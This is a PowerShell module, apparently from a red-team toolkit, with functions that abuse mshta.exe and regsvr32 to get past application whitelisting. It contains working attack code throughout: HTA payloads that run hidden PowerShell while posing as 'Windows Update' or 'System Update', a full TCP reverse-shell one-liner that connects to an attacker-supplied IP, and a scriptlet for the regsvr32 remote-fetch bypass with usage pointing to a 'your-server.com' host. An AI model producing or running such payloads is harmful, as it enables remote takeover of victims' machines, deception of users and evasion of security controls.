<#
.SYNOPSIS
    Execute code via MSHTA to bypass application whitelisting

.DESCRIPTION
    MSHTA.exe is the Microsoft HTML Application Host, a signed Microsoft binary
    that can execute HTML Applications (HTA files) and inline scripts.

    Execution methods:
    - Remote HTA file via URL
    - Inline VBScript via vbscript: protocol
    - Inline JavaScript via javascript: protocol

.AUTHOR
    Anubhav Gain (@anubhavg-icpl)

.PARAMETER Command
    PowerShell command to execute

.PARAMETER Url
    URL to HTA file

.PARAMETER Inline
    Use inline script execution (no file required)

.EXAMPLE
    Invoke-MshtaBypass -Command "Get-Process"
    Invoke-MshtaBypass -Url "http://your-server.com/payload.hta"
    Invoke-MshtaBypass -Command "calc.exe" -Inline
#>

function Invoke-MshtaBypass {
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName = 'Command')]
        [string]$Command,

        [Parameter(ParameterSetName = 'URL')]
        [string]$Url,

        [switch]$Inline,

        [string]$OutputPath
    )

    Write-Host @"

============================================================
  MSHTA APPLICATION WHITELISTING BYPASS
============================================================
  MSHTA.exe executes HTML Applications with full system access.
  Bypasses application whitelisting and executes with no sandbox.
============================================================

"@ -ForegroundColor Cyan

    $mshta = "C:\Windows\System32\mshta.exe"

    if (-not (Test-Path $mshta)) {
        Write-Error "MSHTA.exe not found"
        return
    }

    if ($Url) {
        Write-Host "[*] Executing remote HTA: $Url" -ForegroundColor Yellow
        & $mshta $Url
    }
    elseif ($Inline) {
        # Inline VBScript execution
        $escapedCommand = $Command -replace '"', '""'

        $vbscript = "vbscript:Execute(""CreateObject(""""WScript.Shell"""").Run """"powershell.exe -NoProfile -Command $escapedCommand"""", 0:close"")"

        Write-Host "[*] Executing inline VBScript..." -ForegroundColor Yellow
        & $mshta $vbscript
    }
    else {
        # Generate HTA file
        $htaPayload = New-HTAPayload -Command $Command

        if ($OutputPath) {
            $htaPayload | Out-File $OutputPath -Encoding UTF8
            Write-Host "[+] HTA saved to: $OutputPath" -ForegroundColor Green
            Write-Host "[*] Execute: mshta.exe $OutputPath" -ForegroundColor Yellow
        }
        else {
            $tempPath = Join-Path $env:TEMP "update_$(Get-Random).hta"
            $htaPayload | Out-File $tempPath -Encoding UTF8

            Write-Host "[*] Executing HTA payload..." -ForegroundColor Yellow

            try {
                & $mshta $tempPath
            }
            finally {
                Start-Sleep -Seconds 2
                Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

function New-HTAPayload {
    <#
    .SYNOPSIS
        Generate HTA payload with VBScript

    .EXAMPLE
        New-HTAPayload -Command "Get-Process" | Out-File payload.hta
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Command,

        [switch]$Hidden
    )

    $windowState = if ($Hidden) { "minimize" } else { "normal" }

    $escapedCommand = $Command -replace '"', '""'

    $htaPayload = @"
<!DOCTYPE html>
<html>
<head>
  <title>Windows Update</title>
  <HTA:APPLICATION
    ID="WindowsUpdate"
    APPLICATIONNAME="Windows Update"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    WINDOWSTATE="$windowState"
    SCROLL="no"
  />

  <script language="VBScript">
    Sub Window_OnLoad
      On Error Resume Next

      Dim objShell
      Set objShell = CreateObject("WScript.Shell")

      ' Execute PowerShell command
      objShell.Run "powershell.exe -NoProfile -WindowStyle Hidden -Command ""$escapedCommand""", 0, False

      ' Close the HTA window
      window.close()
    End Sub
  </script>
</head>
<body bgcolor="#000000">
  <div style="color:#fff;font-family:Arial;">Updating system components...</div>
</body>
</html>
"@

    return $htaPayload
}

function New-HTAReverseShell {
    <#
    .SYNOPSIS
        Generate HTA reverse shell payload

    .EXAMPLE
        New-HTAReverseShell -IP 192.168.1.100 -Port 4444 -OutputPath shell.hta
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$IP,

        [Parameter(Mandatory)]
        [int]$Port,

        [Parameter(Mandatory)]
        [string]$OutputPath
    )

    $htaPayload = @"
<!DOCTYPE html>
<html>
<head>
  <title>System Update</title>
  <HTA:APPLICATION
    ID="SystemUpdate"
    APPLICATIONNAME="System Update"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
  />

  <script language="VBScript">
    Sub Window_OnLoad
      On Error Resume Next

      Dim objShell, command
      Set objShell = CreateObject("WScript.Shell")

      ' PowerShell reverse shell one-liner
      command = "powershell.exe -NoProfile -WindowStyle Hidden -Command ""`$client = New-Object System.Net.Sockets.TCPClient('$IP',$Port);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()"""

      objShell.Run command, 0, False

      window.close()
    End Sub
  </script>
</head>
<body bgcolor="#000000">
  <div style="color:#fff;">Updating...</div>
</body>
</html>
"@

    $htaPayload | Out-File $OutputPath -Encoding UTF8

    Write-Host "[+] Reverse shell HTA saved to: $OutputPath" -ForegroundColor Green
    Write-Host "[*] Start listener: nc -lvp $Port" -ForegroundColor Yellow
    Write-Host "[*] Execute: mshta.exe $OutputPath" -ForegroundColor Yellow
}

function New-SCTPayload {
    <#
    .SYNOPSIS
        Generate SCT (scriptlet) payload for regsvr32 bypass

    .EXAMPLE
        New-SCTPayload -Command "calc.exe" -OutputPath payload.sct
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Command,

        [Parameter(Mandatory)]
        [string]$OutputPath
    )

    $escapedCommand = $Command -replace '"', '\"'

    $sctPayload = @"
<?XML version="1.0"?>
<scriptlet>
  <registration
    description="NativeRed"
    progid="NativeRed"
    version="1.00"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}"
    remotable="true">
  </registration>

  <script language="JScript">
    <![CDATA[
      var shell = new ActiveXObject("WScript.Shell");
      shell.Run("powershell.exe -NoProfile -WindowStyle Hidden -Command \"$escapedCommand\"", 0, false);
    ]]>
  </script>
</scriptlet>
"@

    $sctPayload | Out-File $OutputPath -Encoding UTF8

    Write-Host "[+] SCT payload saved to: $OutputPath" -ForegroundColor Green
    Write-Host @"

[*] USAGE:
    Host the SCT file on a web server, then execute:
    regsvr32.exe /s /n /u /i:http://your-server.com/payload.sct scrobj.dll

    Or locally:
    regsvr32.exe /s /n /u /i:$OutputPath scrobj.dll
"@ -ForegroundColor Yellow
}

# Export functions
Export-ModuleMember -Function Invoke-MshtaBypass, New-HTAPayload, New-HTAReverseShell, New-SCTPayload
